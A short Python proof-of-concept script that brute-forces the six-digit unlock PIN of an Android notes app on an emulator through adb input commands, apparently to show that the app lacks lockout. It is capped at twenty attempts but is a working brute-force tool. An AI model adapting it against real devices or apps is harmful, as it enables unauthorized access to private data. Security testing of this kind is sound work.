import subprocess
import time
import sys

ADB = r"C:\Users\Fawaz\AppData\Local\Android\Sdk\platform-tools\adb.exe"
DEVICE = "emulator-5554"
PACKAGE = "com.SeniorProject.safenotes"
TARGET_PIN = "123456"  # The PIN we are trying to find
MAX_ATTEMPTS = 20      # Limit for demonstration purposes

def adb(command):
    full_cmd = [ADB, "-s", DEVICE] + command
    result = subprocess.run(full_cmd, capture_output=True, text=True)
    return result.stdout.strip()

def send_pin_attempt(pin):
    # Clear the current input field
    adb(["shell", "input", "keyevent", "KEYCODE_CTRL_A"])
    adb(["shell", "input", "keyevent", "KEYCODE_DEL"])
    # Type the PIN
    adb(["shell", "input", "text", pin])
    # Tap the Unlock button (approximate coordinates for emulator)
    adb(["shell", "input", "tap", "540", "900"])
    time.sleep(0.5)

def run_brute_force():
    print("=" * 50)
    print("SafeNotes PIN Brute Force - POC")
    print("=" * 50)
    print(f"Target device  : {DEVICE}")
    print(f"Package        : {PACKAGE}")
    print(f"Max attempts   : {MAX_ATTEMPTS}")
    print("=" * 50)

    start_time = time.time()
    attempts = 0

    for i in range(MAX_ATTEMPTS):
        pin = str(i).zfill(6)
        print(f"Attempt {i+1:4d}: Trying PIN {pin}")
        send_pin_attempt(pin)
        attempts += 1

        if pin == TARGET_PIN:
            elapsed = time.time() - start_time
            print(f"\nPIN FOUND: {pin}")
            print(f"Attempts : {attempts}")
            print(f"Time     : {elapsed:.2f} seconds")
            sys.exit(0)

    elapsed = time.time() - start_time
    rate = attempts / elapsed * 60

    print("=" * 50)
    print(f"Demonstration complete")
    print(f"Attempts made     : {attempts}")
    print(f"Time elapsed      : {elapsed:.2f} seconds")
    print(f"Estimated rate    : {rate:.1f} attempts per minute")
    print(f"Est. time for all : {1000000 / rate:.0f} minutes for 1,000,000 combinations")
    print("=" * 50)
    print("RESULT: No lockout triggered. Attack feasible.")

if __name__ == "__main__":
    run_brute_force()